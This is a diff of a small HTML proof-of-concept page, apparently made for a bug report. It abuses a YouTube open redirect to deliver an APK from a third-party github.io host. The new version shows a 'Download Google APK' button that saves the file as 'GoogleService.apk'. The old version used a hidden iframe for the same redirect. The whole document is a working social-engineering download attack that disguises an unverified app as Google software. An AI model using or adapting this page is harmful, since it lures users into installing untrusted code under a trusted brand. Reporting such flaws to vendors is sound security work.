@@ -1,7 +1,17 @@
-<a href="#" onclick="poc()">click me to download google apk</a>
+<!DOCTYPE html>
+<html>
+<body>
+
+<button onclick="download()">Download Google APK</button>
+
 <script>
-    function poc(){
-    document.getElementById("ifr").src="https://www.youtube.com/redirect?q=https://ybt01.github.io/upload/app-debug.apk&sa=D&source=buganizer&usg=AOvVaw3nm-qJSzcGfjAOwSO0tcBK";
-    }
+function download() {
+  let a = document.createElement('a');
+  a.href = "https://www.youtube.com/redirect?q=https://ybt01.github.io/upload/app-debug.apk&sa=D";
+  a.download = "GoogleService.apk";
+  a.click();
+}
 </script>
-<iframe id="ifr" src style="display:none"></iframe>
+
+</body>
+</html>
